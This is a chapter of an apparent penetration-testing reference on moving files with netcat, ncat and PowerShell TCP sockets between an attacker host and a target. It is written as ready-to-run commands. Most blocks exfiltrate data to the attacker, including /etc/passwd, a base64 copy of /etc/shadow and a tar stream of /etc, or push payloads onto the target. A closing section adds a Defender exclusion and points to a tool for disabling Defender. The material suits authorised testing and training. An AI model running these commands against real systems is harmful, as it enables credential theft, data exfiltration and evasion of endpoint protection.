# 07 - Netcat

> [← README](../../README.md) · [Next section →](08-rdp-winrm.md)

The basic transport: works over any single open TCP port when there's no wget/curl and no way to stand up a proper server.

> `LHOST` is our box (attacker), `RHOST` is the target. In each block, the **`# LHOST SHELL`** or **`# RHOST SHELL`** header tells you which console to run the command in. Don't mix them up - that's half of all beginner mistakes.
>
> **Moved to other files:** SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), HTTP upload - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md), encoding - [10](10-encoding.md).

---

## Navigation

|  |  |
|---|---|
| [Two axes: who listens and which way the file flows](#two-axes-who-listens-and-which-way-the-file-flows) | [Connection close flag: `-q 0` / `-N`](#connection-close-flag--q-0---n) |
| [1.🐧Linux](#1linux) | [2.🪟Windows](#2windows) |
| [3. ncat](#3-ncat) | [4. Diagnostics](#4-diagnostics) |
| [5. Bypassing Windows Defender (for nc.exe)](#5bypassing-windows-defender-for-ncexe) |  |

---

## Two axes: who listens and which way the file flows

A Netcat transfer comes down to **two independent questions**, and people constantly confuse them.

**Axis 1 - WHO LISTENS (connection direction):**

| Mode | Who listens (`-l`) | Who connects | When |
|-------|--------------------|------------------|-------|
| **REVERSE** | **LHOST** (us) | RHOST (target) | Default. The target "calls back" to us - bypasses a firewall that blocks inbound connections to the target. |
| **BIND** | **RHOST** (target) | LHOST (us) | When we can reach the target but it can't reach us. |

**Axis 2 - WHICH WAY THE FILE FLOWS (data direction):** set by the redirect, not by who listens.

| Redirect | What the side does |
|----------|--------------------|
| `< file` | **SENDS** (reads the file into the socket) |
| `> file` | **RECEIVES** (writes from the socket into the file) |

**Important:** who listens and who sends are **independent**. The listening side can either serve (`<`) or receive (`>`). Hence the 4 combinations (REVERSE/BIND × download/exfil) for each OS below.

---

## Connection close flag: `-q 0` / `-N`

By default `nc` keeps the connection open after end of data (EOF) - the receiver doesn't know the file is finished and just **hangs** (especially with `tar` and pipes: you end up with a truncated file). The flag fixes that.

**GNU / traditional netcat and ncat - close immediately after EOF:**
```bash
-q 0
```

**OpenBSD-netcat (recent Debian/Ubuntu/Kali) - close the socket on EOF:**
```bash
-N
```

> If you don't know which `nc` you have, try `-q 0` first; if it complains about the flag, use `-N`. The commands below use `-q 0` - swap it if needed.

| `nc` variant | Closing | Where you see it |
|--------------|----------|-----------------|
| traditional / GNU | `-q 0` | `netcat-traditional` package |
| OpenBSD | `-N` | `netcat-openbsd` package (Kali) |
| ncat (nmap) | `-q 0` | `nmap` / `ncat` package |

---

## 1.🐧Linux

### Download a file TO the target (LHOST → RHOST)

#### REVERSE

**LHOST SHELL - listen and SERVE the file:**
```bash
nc -lvnp 4444 -q 0 < /tmp/payload.sh
```

**RHOST SHELL - connect and RECEIVE:**
```bash
nc -q 0 $LHOST 4444 > /tmp/payload.sh
```

#### BIND

**RHOST SHELL - the target listens and RECEIVES:**
```bash
nc -lvnp 4444 -q 0 > /tmp/payload.sh
```

**LHOST SHELL - connect to the target and SERVE:**
```bash
nc -q 0 $RHOST 4444 < /tmp/payload.sh
```

### Pull a file FROM the target / exfiltration (RHOST → LHOST)

#### REVERSE

**LHOST SHELL - listen and RECEIVE:**
```bash
nc -lvnp 4444 -q 0 > loot.tar
```

**RHOST SHELL - connect and SERVE the file:**
```bash
nc -q 0 $LHOST 4444 < /etc/passwd
```

**RHOST SHELL - same via a pipe:**
```bash
cat /etc/passwd | nc -q 0 $LHOST 4444
```

#### BIND

**RHOST SHELL - the target listens and SERVES the file:**
```bash
nc -lvnp 4444 -q 0 < /etc/passwd
```

**LHOST SHELL - connect and RECEIVE:**
```bash
nc -q 0 $RHOST 4444 > loot.tar
```

### Transferring a whole directory (tar | nc)

Pack the directory into a tar stream and pour it over a single connection - nothing intermediate hits disk. `-q 0` / `-N` is mandatory here, otherwise tar won't close.

**LHOST SHELL - pack the `cats-pack` directory and serve it (REVERSE, to the target):**
```bash
tar czf - cats-pack | nc -lvnp 4444 -q 0
```

**RHOST SHELL - receive and unpack into the current folder:**
```bash
nc -q 0 $LHOST 4444 | tar xzf -
```

**LHOST SHELL - receive and unpack (REVERSE, from the target):**
```bash
nc -lvnp 4444 -q 0 | tar xzf -
```

**RHOST SHELL - pack the `/etc` directory and serve it:**
```bash
tar czf - /etc | nc -q 0 $LHOST 4444
```

**With `pv` - you see progress and speed (if installed):**
```bash
tar czf - /etc | pv | nc -q 0 $LHOST 4444
```

### base64 channel over netcat

For fussy channels - move the file as text (REVERSE, exfiltration).

**LHOST SHELL - receive base64:**
```bash
nc -lvnp 4444 -q 0 > loot.b64
```

**RHOST SHELL - encode the file as base64 and send it:**
```bash
base64 -w0 /etc/shadow | nc -q 0 $LHOST 4444
```

**LHOST SHELL - decode:**
```bash
base64 -d loot.b64 > loot
```

More on this - [10 - Encoding](10-encoding.md).

---

## 2.🪟Windows

Windows has no native `nc`. The `nc.exe` commands below need the binary on the target: in Kali it's at `/usr/share/windows-resources/binaries/` (AV flags it - drop it on the target using the methods from [01](01-attacker-to-target.md)). If you can't drop `nc.exe`, jump straight to "No nc → PowerShell TCP client".

### Download a file TO the target (LHOST → RHOST)

#### REVERSE

**LHOST SHELL - listen and SERVE the file:**
```bash
nc -lvnp 4444 -q 0 < payload.exe
```

**RHOST SHELL (CMD) - connect and RECEIVE:**
```cmd
nc.exe -q 0 %LHOST% 4444 > payload.exe
```

#### BIND

**RHOST SHELL (CMD) - the target listens and RECEIVES:**
```cmd
nc.exe -lvnp 4444 > payload.exe
```

**LHOST SHELL - connect to the target and SERVE:**
```bash
nc -q 0 $RHOST 4444 < payload.exe
```

### Pull a file FROM the target / exfiltration (RHOST → LHOST)

#### REVERSE

**LHOST SHELL - listen and RECEIVE:**
```bash
nc -lvnp 4444 -q 0 > secrets.zip
```

**RHOST SHELL (CMD) - connect and SERVE the file:**
```cmd
nc.exe -q 0 %LHOST% 4444 < C:\Users\Public\secrets.zip
```

#### BIND

**RHOST SHELL (CMD) - the target listens and SERVES the file:**
```cmd
nc.exe -lvnp 4444 < C:\Users\Public\secrets.zip
```

**LHOST SHELL - connect and RECEIVE:**
```bash
nc -q 0 $RHOST 4444 > secrets.zip
```

### No nc → PowerShell TCP client

For when you can't drop `nc.exe`.

#### REVERSE - exfiltration (the target connects and sends the file)

**LHOST SHELL - receive:**
```bash
nc -nlvp 4445 > received_file.zip
```

**RHOST SHELL (PowerShell) - read the file and write it to the socket:**
```powershell
$bytes = [IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip")
$socket = New-Object Net.Sockets.TcpClient("$LHOST", 4445)
$stream = $socket.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$socket.Close()
```

**RHOST SHELL (CMD one-liner) - same thing on one line:**
```cmd
powershell -c "$b=[IO.File]::ReadAllBytes('C:\Users\Public\secrets.zip');$s=New-Object Net.Sockets.TcpClient('%LHOST%',4445);$t=$s.GetStream();$t.Write($b,0,$b.Length);$s.Close()"
```

#### REVERSE - download to the target (the target receives the file)

**LHOST SHELL - serve the file:**
```bash
nc -lvnp 4445 -q 0 < payload.exe
```

**RHOST SHELL (PowerShell) - receive the stream and write it to a file:**
```powershell
$c = New-Object Net.Sockets.TcpClient("$LHOST", 4445)
$s = $c.GetStream()
$ms = New-Object IO.MemoryStream
$buf = New-Object byte[] 8192
while (($n = $s.Read($buf, 0, $buf.Length)) -gt 0) { $ms.Write($buf, 0, $n) }
[IO.File]::WriteAllBytes("C:\Users\Public\payload.exe", $ms.ToArray())
$c.Close()
```

#### BIND - the target listens, we connect

**RHOST SHELL (PowerShell) - listen and serve the file:**
```powershell
$l = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 4444)
$l.Start()
$c = $l.AcceptTcpClient()
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip")
$s.Write($b, 0, $b.Length); $s.Close(); $c.Close(); $l.Stop()
```

**LHOST SHELL - connect and receive:**
```bash
nc -q 0 $RHOST 4444 > secrets.zip
```

### base64 channel over netcat

REVERSE, exfiltration.

**LHOST SHELL - receive base64:**
```bash
nc -lvnp 4444 -q 0 > received_b64.txt
```

**RHOST SHELL (PowerShell) - encode the file as base64 and send it to the socket:**
```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt"))
$c = New-Object Net.Sockets.TcpClient("$LHOST", 4444)
$w = New-Object IO.StreamWriter($c.GetStream())
$w.Write($b64); $w.Flush(); $c.Close()
```

**LHOST SHELL - decode:**
```bash
base64 -d received_b64.txt > file
```

More on this - [10 - Encoding](10-encoding.md).

---

## 3. ncat

A modern rework of netcat (from nmap): SSL, IPv6, SOCKS/HTTP proxy, brokering. https://nmap.org/ncat/

**Install:**
```bash
sudo apt install -y ncat
```

**Normal transfer (like nc):**
```bash
ncat -lvnp 4444 > secrets.zip
```

**With TLS (`--ssl`) - an encrypted channel with no extra fuss:**
```bash
ncat --ssl -lvnp 4444 > secrets.zip
```

**Client with TLS:**
```bash
ncat --ssl $LHOST 4444 < secrets.zip
```

**Allow only one IP (ACL):**
```bash
ncat -lvnp 4444 --allow $RHOST > secrets.zip
```

**Serve a file over SSL:**
```bash
ncat --ssl -lvnp 4444 --send-only < payload.exe
```

---

## 4. Diagnostics

**Which nc variant you have and what flags it supports:**
```bash
nc -h 2>&1 | head -20
```

**ncat version:**
```bash
ncat --version
```

**The port is actually listening on LHOST:**
```bash
ss -tlnp | grep 4444
```

**Check that the port is reachable (ncat):**
```bash
ncat -zv $RHOST 4444
```

> **Common pitfalls:**
>
> - **Forgot `-q 0` / `-N`** → the receiver hangs and the file is truncated (especially `tar`/pipes). This is the number one cause of incomplete files.
> - **`-l` without `-p` (or vice versa).** Traditional/GNU: `nc -lvnp 4444`. OpenBSD: that works too, but `nc -l 4444` is enough. If a flag isn't accepted, check the variant (`nc -h`).
> - **The target's firewall** blocks the inbound port in BIND mode → use REVERSE (the target calls us).
> - **AV flags `nc.exe`** → use the PowerShell option or a Defender exclusion (below).
> - **No `nc.exe` on Windows** → PowerShell `TcpClient`/`TcpListener` (section 2).
> - **`nc -e` is stripped** in many builds - not our path for shells, but remember it isn't needed for files anyway.
> - **Don't forget the hash** after the transfer (see [01](01-attacker-to-target.md#4-integrity-check)).

---

## 5.🪟Bypassing Windows Defender (for nc.exe)

**RHOST SHELL - add the current directory to Defender exclusions (admin rights required):**
```powershell
Add-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction Stop
```

> This changes Defender settings. Use it only on an authorized, disposable lab host, and remove the exclusion afterwards with `Remove-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction SilentlyContinue`.

Another option for disabling it: https://github.com/es3n1n/defendnot

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [09 - LOLBins](09-lolbins.md) · [10 - Encoding](10-encoding.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# usage: $LHOST
```

See the [README](../../README.md#notation-and-variables) for details.

---

[← Back to the reference](../../README.md)
